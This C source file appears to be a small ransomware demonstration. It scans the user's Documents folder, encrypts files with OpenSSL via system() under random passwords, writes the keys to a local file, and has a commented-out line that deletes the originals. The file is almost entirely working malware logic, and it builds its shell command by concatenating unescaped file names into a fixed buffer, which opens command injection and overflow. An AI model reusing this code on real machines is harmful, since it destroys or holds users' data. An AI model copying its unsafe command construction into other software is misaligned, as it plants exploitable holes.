#include <unistd.h>
#include <pwd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>

//Function to generate random string of given length
char *randString(int length){
        char string[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        
        char *randomstring=malloc(sizeof(char)*(length+1));
        int curr=0;
        for(int i=0;i<length;i++){
                curr=rand()%62;
                randomstring[i]=string[curr];
        }
        randomstring[length]='\0';
        return randomstring;
}

//Function to encrypt the given file and place encrypted file to a $to location
void encrypt(char *from, char *to, char *pass){

        char command[256]="openssl aes-256-cbc -a -md sha512 -pbkdf2 -iter 100000 -in \"";
        strcat(command,from);
        strcat(command,"\" -out \"");
        strcat(command,to);
        strcat(command,"\" -pass pass:");
        strcat(command,pass);
        system(command);

        //To decrypt: openssl aes-256-cbc -d -a -md sha512 -pbkdf2 -iter 100000 -in $from -out $to -pass pass:$pass
}

int main(int argc, char **argv, char **envp){

srand(time(NULL));

// Using HOME Environment Variable
char *homedir = getenv("HOME");

//This is the location where the encrypted files will be saved
char encrypted_location[100];
strcpy(encrypted_location,homedir);
strcat(encrypted_location,"/Documents/Encrypted");

struct stat st = {0};
if(stat(encrypted_location,&st)==-1){
        mkdir(encrypted_location,0700);
}

//This the location where the keys of decryption will be saved
char decrypted_location[100];
strcpy(decrypted_location,homedir);
strcat(decrypted_location,"/Documents/Decrypted");

struct stat st2 = {0};
if(stat(decrypted_location,&st2)==-1){
        mkdir(decrypted_location,0700);
}

//Creating the keys.txt file to save the keys in
FILE *key;
char key_file[100];
strcpy(key_file,decrypted_location);
strcat(key_file,"/keys.txt");
key=fopen(key_file,"a");

//This is the directory where we are attacking
char important_directory[100];
strcpy(important_directory,homedir);
strcat(important_directory,"/Documents");

DIR *d;
struct dirent *dir;
int status;
d=opendir(important_directory);

//Setting the limit to number of files to be encrypted
int max_files=2;
char files_from[max_files][256];
char files_to[max_files][256];
int cnt=0;

if(d){
        while((dir=readdir(d))!=NULL){
                char file_address[256];
                strcpy(file_address,important_directory);
                strcat(file_address,"/");
                strcat(file_address,dir->d_name);

                
                struct stat st_buf;
                status=stat(file_address,&st_buf);
                if(status!=0){
                        //Status cannot be accessed
                        fprintf(stderr,"Error, errno: %d\n",errno); 
                        return 1;
                }
                if(S_ISREG(st_buf.st_mode)){
                        //It is a regular file
                        if(cnt==max_files)
                                break;
                        strcpy(files_to[cnt],encrypted_location);
                        strcat(files_to[cnt],"/");
                        strcat(files_to[cnt],dir->d_name);
                        strcat(files_to[cnt],".enc");

                        strcpy(files_from[cnt],file_address);
                        cnt++;
                }else{
                        //It is a directory
                }
        }
        closedir(d);
}

for(int i=0;i<cnt;i++){
        char *pass=randString(11);
        
        encrypt(files_from[i],files_to[i],pass);
        
        fprintf(key,"%s : %s\n",files_from[i],pass);

        //Uncomment the below to remove the original files at the end
        // remove(files_from[i]);
}

fclose(key);

return 0;
}